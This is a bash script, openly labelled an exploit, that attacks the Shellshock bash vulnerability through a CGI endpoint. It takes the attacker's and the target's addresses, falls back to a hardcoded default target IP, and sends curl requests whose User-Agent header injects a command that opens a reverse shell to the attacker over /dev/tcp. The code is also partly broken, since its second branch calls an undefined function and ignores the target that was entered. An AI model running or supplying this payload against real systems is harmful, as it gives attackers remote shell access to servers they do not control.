#! /bin/bash

echo "Commencing exploit..."
echo "Please set up listener"

default_ip=18.219.242.244
default_cgi=example-bash


read -p "Attacker IP and port [ <ip> <port> ]: " -a attacker_info
read -p "Target IP and cgi file [ <ip> <cgi-file> ]: " -a target_info

if [[ ${#attacker_info[@]} -eq 0 ]] || [[ ${#attacker_info[@]} -eq 1 ]];
then
    echo Attacker info not provided
    echo Skipping exploit...
    exit
else
    if [[ ${#target_info[@]} -eq 0 ]] || [[ ${#target_info[@]} -eq 1 ]];
    then
        echo Target info not provided: using defaults
        echo Target ip: $default_ip
        echo Target cgi-file: $default_cgi
        
        curl -H "User-Agent: () { :; }; /usr/local/bin/bash -c '/usr/local/bin/bash -i >& /dev/tcp/${attacker_info[0]}/${attacker_info[1]} 0>&1'" http://$default_ip/cgi-bin/$default_cgi
    else
        print_verbosity "" 0
        curl -H "User-Agent: () { :; }; /usr/local/bin/bash -c '/usr/local/bin/bash -i >& /dev/tcp/${attacker_info[0]}/${attacker_info[1]} 0>&1'" http://$default_ip/cgi-bin/$default_cgi

    fi
fi






